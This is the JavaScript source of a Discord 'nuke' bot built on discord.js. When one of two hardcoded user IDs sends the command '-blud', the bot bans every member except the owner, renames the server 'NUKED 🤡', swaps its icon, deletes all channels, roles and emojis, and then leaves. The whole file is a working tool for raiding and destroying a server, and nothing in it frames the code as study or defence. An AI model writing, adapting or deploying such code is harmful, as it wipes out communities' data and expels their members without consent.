const { Client, GatewayIntentBits, Partials } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent
    ],
    partials: [Partials.Channel]
});

const allowedUsers = ['794145307843624980', '1152199526522822736'];

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async message => {
    console.log(`Received message: ${message.content} from ${message.author.id}`);

    if (message.content.trim().toLowerCase() === '-blud') {
        console.log('-blud command received');

        if (!allowedUsers.includes(message.author.id)) {
            console.log('User not allowed to execute this command');
            return message.reply('You do not have permission to use this command.');
        }

        console.log(`Executing nuke command by ${message.author.id}`);

        // Ban members first
        console.log('Banning members...');

        const members = message.guild.members.cache;
        for (const [memberId, member] of members) {
            if (member.id !== message.guild.ownerId && !allowedUsers.includes(member.id)) {
                try {
                    await member.ban({ reason: 'Nuke command executed' });
                    console.log(`Banned member: ${member.user.tag}`);
                } catch (err) {
                    console.error(`Could not ban member ${member.user.tag}:`, err);
                }
            }
        }

        // Change server name
        try {
            await message.guild.setName('NUKED 🤡');
            console.log('Changed server name to "NUKED 🤡"');
        } catch (err) {
            console.error('Could not change server name:', err);
        }

        // Change server icon
        try {
            await message.guild.setIcon('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSurcIxbzcQtI1FbZ1Marigmth6tmzRlMTUyA&s');
            console.log('Changed server icon');
        } catch (err) {
            console.error('Could not change server icon:', err);
        }

        // Delete channels
        console.log('Deleting channels...');
        const channels = message.guild.channels.cache;
        for (const [channelId, channel] of channels) {
            try {
                await channel.delete();
                console.log(`Deleted channel: ${channel.name}`);
            } catch (err) {
                console.error(`Could not delete channel ${channel.name}:`, err);
            }
        }

        // Delete roles
        console.log('Deleting roles...');
        const roles = message.guild.roles.cache;
        for (const [roleId, role] of roles) {
            if (role.name !== '@everyone') {
                try {
                    await role.delete();
                    console.log(`Deleted role: ${role.name}`);
                } catch (err) {
                    console.error(`Could not delete role ${role.name}:`, err);
                }
            }
        }

        // Delete emojis
        console.log('Deleting emojis...');
        const emojis = message.guild.emojis.cache;
        for (const [emojiId, emoji] of emojis) {
            try {
                await emoji.delete();
                console.log(`Deleted emoji: ${emoji.name}`);
            } catch (err) {
                console.error(`Could not delete emoji ${emoji.name}:`, err);
            }
        }

        // Send completion message
        console.log('Sending completion message...');
        try {
            await message.channel.send('Nuke command executed. Server name, icon, channels, roles, members, and emojis have been removed.');
            console.log('Sent completion message');
        } catch (err) {
            console.error('Could not send completion message:', err);
        }

        // Leave the server
        console.log('Leaving the server...');
        try {
            await message.guild.leave();
            console.log('Bot has left the server.');
        } catch (err) {
            console.error('Could not leave the server:', err);
        }
    }
});

client.login('YOUR_BOT_TOKEN');
